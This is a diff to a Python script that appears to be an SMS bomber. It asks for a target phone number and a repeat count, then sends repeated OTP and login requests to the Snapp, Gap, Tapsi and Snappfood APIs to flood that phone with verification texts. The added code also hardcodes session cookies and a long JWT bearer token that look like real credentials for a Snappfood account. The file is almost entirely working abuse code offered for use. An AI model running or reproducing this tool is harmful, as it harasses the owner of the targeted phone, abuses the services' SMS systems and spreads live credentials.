@@ -1,9 +1,18 @@
 import requests
 
 
-    
+print("******************************************")
+print("******************************************")
+print("***** devloper : MOHAMMAD  DOSTIPOR ******")
+print("******************************************")
+print("******************************************")
 phone = input("ENTER THE PHONE PHONE NUMBER : ")
+print("------------------------------------------")
+print("------------------------------------------")
 Number =int(input("ENTER THE NUMBER : "))
+print("******************************************")
+print("******************************************")
+
 for X in range(Number):
     headers = {
         'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
@@ -226,4 +235,140 @@ for X in range(Number):
     
     
 
+
+
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
+        'Accept': '*/*',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Referer': 'https://snapp.ir/',
+        'content-type': 'application/json',
+        'Origin': 'https://snapp.ir',
+        'Connection': 'keep-alive',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-site',
+    }
+
+    json_data = {
+        'phone': phone,
+    }
+
+    response = requests.post('https://api.snapp.ir/api/v1/sms/link', headers=headers, json=json_data)
+    print(response)
+    
+    
+    
+    
+    
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'fa',
+        'Content-Type': 'application/octet-stream',
+        'project': 'gap',
+        'APPVERSION': 'web',
+        'X-VERSION': '5.0.0-beta.3',
+        'Origin': 'https://web.gap.im',
+        'Connection': 'keep-alive',
+        'Referer': 'https://web.gap.im/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-site',
+    }
+
+    data = 'Þ\x00\x01¦mobile\xad+phone'.encode()
+
+    response = requests.post('https://core.gap.im/v1/user/sendOTP.gap', headers=headers, data=data)
+    print(response)
+    
+    
+    
+    
+    
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
+        'Accept': '*/*',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Referer': 'https://app.tapsi.cab/',
+        'content-type': 'application/json',
+        'x-agent': 'v2.2|passenger|WEBAPP|6.21.10||5.0',
+        'Origin': 'https://app.tapsi.cab',
+        'Connection': 'keep-alive',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-site',
+    }
+
+    json_data = {
+        'credential': {
+            'phoneNumber': phone,
+            'role': 'PASSENGER',
+        },
+        'otpOption': 'SMS',
+    }
+
+    response = requests.post('https://api.tapsi.cab/api/v2.2/user', headers=headers, json=json_data)
+    print(response)
+    
+    
+    
+    
+    cookies = {
+        'UUID': '6aa00ed1-bbbd-4d6b-bff8-debfbc148bf3',
+        'PHPSESSID': '93ddd38a53fc18ce697191ff97ce6ddc',
+        'rl_anonymous_id': 'RudderEncrypt%3AU2FsdGVkX1%2Bl5Octs38b3v%2Ba9T6kzGw49rpMXdcSgUZYnrbvZ%2BsuRobmpU5IZT8t4iokaWFcjWJDB5V9WSXk5w%3D%3D',
+        'rl_user_id': 'RudderEncrypt%3AU2FsdGVkX1%2BhWGZtmxLrWpH5phQm3bIvTP8cDCCqwoY%3D',
+        'rl_group_id': 'RudderEncrypt%3AU2FsdGVkX180MxsuqA4bjkRmmZLL%2FmmaLxSyn7%2B0F6g%3D',
+        'rl_trait': 'RudderEncrypt%3AU2FsdGVkX1%2BwV20iSmvPiUzeS69%2FcoDWRdPAf91DspA%3D',
+        'rl_group_trait': 'RudderEncrypt%3AU2FsdGVkX1%2FAg4aSRIYFX%2FA7LGxyrzCqYFFIzFwN8Mw%3D',
+        'rl_page_init_referrer': 'RudderEncrypt%3AU2FsdGVkX1%2FLL6ECLK9uGQlSEL1C4s4ZLxoQ6M6%2BCwSzIG4q1nNqKd2rsrdvtQUe',
+        'rl_page_init_referring_domain': 'RudderEncrypt%3AU2FsdGVkX1%2FD8CkPndewmvVVjPID9wqnhgj%2FdcWLuLU8x1M2Q3K6J84xMcnQ69BD',
+        'jwt-access_token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjRlYTliMjNlNWY4YTYyNzkxNzNkYjliYjA3ZmEwYWE5NjQ2MmI3ZGRmNmQ2YWQzNWYyYThjMTAxMTZhMWMyMzBjZjMwYzRkNjliM2E1YTM4In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNGVhOWIyM2U1ZjhhNjI3OTE3M2RiOWJiMDdmYTBhYTk2NDYyYjdkZGY2ZDZhZDM1ZjJhOGMxMDExNmExYzIzMGNmMzBjNGQ2OWIzYTVhMzgiLCJpYXQiOjE3MTU1ODI4MjUsIm5iZiI6MTcxNTU4MjgyNSwiZXhwIjoxNzE4MjYxMzQ1LCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.LvBA8RZegOX6sSB9KUKpjsBgGHBUBtAn9QD8_lhpNT2JDWv6Ec_U6328E7O6-KkFVxQJfmPvKZvfu-iimZbLe-GRcYnn1aD6wmWOhzh9jD-rXdnnvzVC41sRF1L5cVYIWhCSOuR9AHy-5OmOZzrJvVqhDlnG-js5Zvn9Pq-B3CEtad__BA2cFtmMBvOir9Qh3547WS9-kCDUbZw_0mW0Lh8dkEci2_HjkxsMtyQtLGFjnZn5lAjjG8sKHOoHf2aTHz2SxyADCsUYsdj9qlP5hLX57wEAOOwW52CzbNm8Pq3rzJ9PvX1309pOm-3RI6pk9qWYXmFU_j_4F-UGwFMff9Zj__kB1hkgIleD6HPZY8ERKBvkmdpmgVoAof876qtdqvlSrn3TAgXUgNuM0VaAoMApmRY_1PqvQ4iVbX3V6WKnZfTUtV7_OxXAlQD_gRD0ogocJe2-B0JG2dHmEbx1Ve2Eu6QX0WbPUnL-CMtx7M-XTFjVUZYV6KtgZPX_J2ZZe9_cY1kl1x-S2ThXhRAFrNDPK2RZvW2wi_x7lLIx_XvKljzvaTolPJiXOUGjSWA4Z3WIjJqbABXL3GnsPt_oXh3Ji7QFOl2LZLVQwmrDQ_158IH2tSC_a3jrQE8ssvXVwcf44ZXCvbplHH7U3QpsmlB0xrLZMejhLCgwd5MM_1vg8Xm67SLKYnVuj_TLJcjtAMXrSa3rNSaTXwBs5NLZfaQPHABqvyqe5ZK7vNiJCxiSedByeatR_0NdznaKraq2k3KX5Za2m8DE1r0VNh4fQ4wP5ALaffS21UBxyRw11OhYs6PFexPHKb9aHr2AckeunR1QK2A0n06DyVIglwaLZ0IvjsQ3BG55zbn0HURhOaKw3wTFIobbp8nVKrDCADeeJRdqO-dK5ZnFnhPIZSEPa0HmJaXGp806RS69o8C4V6GyhgHuG0WJkdCh6MOBeOAJ4qoyP5FF_oouACXeNg3nGr4fXxskLYwaDTdanthsg2dSLKqUZt9QhfNq8hWcFD4LJb18XVBBsFjantCid5zAPZJa6JMTJ-kbULGM1hiA1HxvYqYE10vlpcwPtVR5da4fEA5Rwtj9En9IZq9icYGAus_iHhEBcrIOQ-kf3xxyTxe59rCewtSTy3UsjKZwkuSwLD5k7mVCkl-2w5f2eCrH0ETiU9QpW_TGBY65svo-lCCy6kzRw937e8LWzDlv6Qe1Y7F3M6k6OVX92679DMqMpZVKbbVT5g8vPWmdsV89rXDQcVHinhF47bOwbh6geo5vwiOlIAj9L8HnxTEGuqKZliCoSNK6_vxJCvw98g9u4LWQXBpVUjwSVlh4WWtIJngxjBS-sNFRwrFEtb010E6YoUAMiYuM58YVKBr9rQbWjoUd6IL4CZHyZCGpfTQN3cz4Q0tLep58jIa3nuDpRuXk1C8zhZQU4n7O29CkKOl00NJv-ni1bU8GtLjtgFYkDcCTgLJTEEDwzmqGQX8HlRE-UEMRKyzgfcoI3jjeqYLwGDRBiT32sw7hGokzBFrQRhkXsTRNvtvYU2BuUXFoSFi6MFz50FcUIx-cHPLBT2FG6cdWGkFyk5QxfRZmeKQ3TOAg3Pol8zI_ucHoNGDmpWpdeYFJp5u7lXZg7e21IQG_lWlladB73M0-QNvZWanKPnVAIU8FoP-tPbGuRzjp9G9fg5Za0mrRX0TuWQefX8GbYVMXc0mhRkIYtSdMomEiBAVYtEfaoRZtXJ9YAcQP_XueZvFQY_juL7-LxJKAMOiG5VgfNygk3ys8DcXdWYnTv8aydaFkza6Akltk4O1PKwqwR4mqjVIij4LTLBGRmSei7fOXxNJ8OWBk260YcWK1ZP5ngNK1YXKvvQ1x7AaYT8gpJ2pl23dF_CNcGebbA5GK_xc1VBpoMn-27wIQpbYv_5vqj8xENi2QU0bFFN7zPCgpNh12x8LM9XZsCur-D5Ju-lk6grWYxWD0KeHsGw-swGNBn5H_SQx6IFlHHYASZJD07vpPuQ39qZqo5Dj3ndkRi5KVqBTECKtOJDTOGpFqQQN3oZMexGGzaagEELW-2pTDimm-pYT1u1vva4CcRA3KvRfpqpln8IukAQakn_pclGOSxl7TDp7ymHaOBz5nR8nWwaqqr08uB1JM1fD4d0fjPqqjsfxMAexeuSHg1Jn4gyuT4wybMA16DbssX-xfmVjkWGVm_fbNV0XysLXVLUbiyNgc3LqC8T-Xn-AqdjeT9LGQspeIASroAqR31fj90pR-iZkH21MuNfzvYhgzHXrIcfJ8iJ6mNESwOU6ALImaxWuqIVKY2hRYXpYYFyGxeidjD9fgIxPbQ6vCliJOhvLPLvzU_smNiQOkjDKoH8xgoGRjJqs32dNgc9j_KEfIljEDdBBamI3NJrGrCHTbCBiGnAyas-2z54fppO9-mgn3IflaOboY3lVvI6AJJ5VbA0HtrkfJdEAyygDpbz3vso1hD3C3mOyKCQsFPI9hvO8yFA_c7DgvBcPnc0RQ990mNfFDLRR3nJCqqLh6HcLuYdQPPx9ESsNW0LhKRaWghKcokMkut67WhgQjNDxjT9A1hqeOowDvl6QoBirMK45o1CxsieBpCZi98rzgoqwJQM79TyJTmslcy9oLr2BqkDnPkShVvVeuxWH_fLP21FVZf_Byr2-JY-MDc9sZT-kxK5QJgJ5hOn5fQ8xFA0H6Ar17PQZXJqkjUGhMywR_FNMXDcrJO3I',
+        'jwt-refresh_token': 'undefined',
+        'jwt-token_type': 'Bearer',
+        'jwt-expires_in': '2678400',
+    }
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjRlYTliMjNlNWY4YTYyNzkxNzNkYjliYjA3ZmEwYWE5NjQ2MmI3ZGRmNmQ2YWQzNWYyYThjMTAxMTZhMWMyMzBjZjMwYzRkNjliM2E1YTM4In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNGVhOWIyM2U1ZjhhNjI3OTE3M2RiOWJiMDdmYTBhYTk2NDYyYjdkZGY2ZDZhZDM1ZjJhOGMxMDExNmExYzIzMGNmMzBjNGQ2OWIzYTVhMzgiLCJpYXQiOjE3MTU1ODI4MjUsIm5iZiI6MTcxNTU4MjgyNSwiZXhwIjoxNzE4MjYxMzQ1LCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.LvBA8RZegOX6sSB9KUKpjsBgGHBUBtAn9QD8_lhpNT2JDWv6Ec_U6328E7O6-KkFVxQJfmPvKZvfu-iimZbLe-GRcYnn1aD6wmWOhzh9jD-rXdnnvzVC41sRF1L5cVYIWhCSOuR9AHy-5OmOZzrJvVqhDlnG-js5Zvn9Pq-B3CEtad__BA2cFtmMBvOir9Qh3547WS9-kCDUbZw_0mW0Lh8dkEci2_HjkxsMtyQtLGFjnZn5lAjjG8sKHOoHf2aTHz2SxyADCsUYsdj9qlP5hLX57wEAOOwW52CzbNm8Pq3rzJ9PvX1309pOm-3RI6pk9qWYXmFU_j_4F-UGwFMff9Zj__kB1hkgIleD6HPZY8ERKBvkmdpmgVoAof876qtdqvlSrn3TAgXUgNuM0VaAoMApmRY_1PqvQ4iVbX3V6WKnZfTUtV7_OxXAlQD_gRD0ogocJe2-B0JG2dHmEbx1Ve2Eu6QX0WbPUnL-CMtx7M-XTFjVUZYV6KtgZPX_J2ZZe9_cY1kl1x-S2ThXhRAFrNDPK2RZvW2wi_x7lLIx_XvKljzvaTolPJiXOUGjSWA4Z3WIjJqbABXL3GnsPt_oXh3Ji7QFOl2LZLVQwmrDQ_158IH2tSC_a3jrQE8ssvXVwcf44ZXCvbplHH7U3QpsmlB0xrLZMejhLCgwd5MM_1vg8Xm67SLKYnVuj_TLJcjtAMXrSa3rNSaTXwBs5NLZfaQPHABqvyqe5ZK7vNiJCxiSedByeatR_0NdznaKraq2k3KX5Za2m8DE1r0VNh4fQ4wP5ALaffS21UBxyRw11OhYs6PFexPHKb9aHr2AckeunR1QK2A0n06DyVIglwaLZ0IvjsQ3BG55zbn0HURhOaKw3wTFIobbp8nVKrDCADeeJRdqO-dK5ZnFnhPIZSEPa0HmJaXGp806RS69o8C4V6GyhgHuG0WJkdCh6MOBeOAJ4qoyP5FF_oouACXeNg3nGr4fXxskLYwaDTdanthsg2dSLKqUZt9QhfNq8hWcFD4LJb18XVBBsFjantCid5zAPZJa6JMTJ-kbULGM1hiA1HxvYqYE10vlpcwPtVR5da4fEA5Rwtj9En9IZq9icYGAus_iHhEBcrIOQ-kf3xxyTxe59rCewtSTy3UsjKZwkuSwLD5k7mVCkl-2w5f2eCrH0ETiU9QpW_TGBY65svo-lCCy6kzRw937e8LWzDlv6Qe1Y7F3M6k6OVX92679DMqMpZVKbbVT5g8vPWmdsV89rXDQcVHinhF47bOwbh6geo5vwiOlIAj9L8HnxTEGuqKZliCoSNK6_vxJCvw98g9u4LWQXBpVUjwSVlh4WWtIJngxjBS-sNFRwrFEtb010E6YoUAMiYuM58YVKBr9rQbWjoUd6IL4CZHyZCGpfTQN3cz4Q0tLep58jIa3nuDpRuXk1C8zhZQU4n7O29CkKOl00NJv-ni1bU8GtLjtgFYkDcCTgLJTEEDwzmqGQX8HlRE-UEMRKyzgfcoI3jjeqYLwGDRBiT32sw7hGokzBFrQRhkXsTRNvtvYU2BuUXFoSFi6MFz50FcUIx-cHPLBT2FG6cdWGkFyk5QxfRZmeKQ3TOAg3Pol8zI_ucHoNGDmpWpdeYFJp5u7lXZg7e21IQG_lWlladB73M0-QNvZWanKPnVAIU8FoP-tPbGuRzjp9G9fg5Za0mrRX0TuWQefX8GbYVMXc0mhRkIYtSdMomEiBAVYtEfaoRZtXJ9YAcQP_XueZvFQY_juL7-LxJKAMOiG5VgfNygk3ys8DcXdWYnTv8aydaFkza6Akltk4O1PKwqwR4mqjVIij4LTLBGRmSei7fOXxNJ8OWBk260YcWK1ZP5ngNK1YXKvvQ1x7AaYT8gpJ2pl23dF_CNcGebbA5GK_xc1VBpoMn-27wIQpbYv_5vqj8xENi2QU0bFFN7zPCgpNh12x8LM9XZsCur-D5Ju-lk6grWYxWD0KeHsGw-swGNBn5H_SQx6IFlHHYASZJD07vpPuQ39qZqo5Dj3ndkRi5KVqBTECKtOJDTOGpFqQQN3oZMexGGzaagEELW-2pTDimm-pYT1u1vva4CcRA3KvRfpqpln8IukAQakn_pclGOSxl7TDp7ymHaOBz5nR8nWwaqqr08uB1JM1fD4d0fjPqqjsfxMAexeuSHg1Jn4gyuT4wybMA16DbssX-xfmVjkWGVm_fbNV0XysLXVLUbiyNgc3LqC8T-Xn-AqdjeT9LGQspeIASroAqR31fj90pR-iZkH21MuNfzvYhgzHXrIcfJ8iJ6mNESwOU6ALImaxWuqIVKY2hRYXpYYFyGxeidjD9fgIxPbQ6vCliJOhvLPLvzU_smNiQOkjDKoH8xgoGRjJqs32dNgc9j_KEfIljEDdBBamI3NJrGrCHTbCBiGnAyas-2z54fppO9-mgn3IflaOboY3lVvI6AJJ5VbA0HtrkfJdEAyygDpbz3vso1hD3C3mOyKCQsFPI9hvO8yFA_c7DgvBcPnc0RQ990mNfFDLRR3nJCqqLh6HcLuYdQPPx9ESsNW0LhKRaWghKcokMkut67WhgQjNDxjT9A1hqeOowDvl6QoBirMK45o1CxsieBpCZi98rzgoqwJQM79TyJTmslcy9oLr2BqkDnPkShVvVeuxWH_fLP21FVZf_Byr2-JY-MDc9sZT-kxK5QJgJ5hOn5fQ8xFA0H6Ar17PQZXJqkjUGhMywR_FNMXDcrJO3I',
+        'Origin': 'https://snappfood.ir',
+        'Connection': 'keep-alive',
+        'Referer': 'https://snappfood.ir/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+    }
+
+    params = {
+        'lat': '35.774',
+        'long': '51.418',
+        'optionalClient': 'WEBSITE',
+        'client': 'WEBSITE',
+        'deviceType': 'WEBSITE',
+        'appVersion': '8.1.1',
+        'UDID': '6aa00ed1-bbbd-4d6b-bff8-debfbc148bf3',
+        'locale': 'fa',
+    }
+
+    data = {
+        'cellphone':phone,
+    }
+
+    response = requests.post(
+        'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass',
+        params=params,
+        cookies=cookies,
+        headers=headers,
+        data=data,
+    )
+    print(response)
+    
+    
+    
     
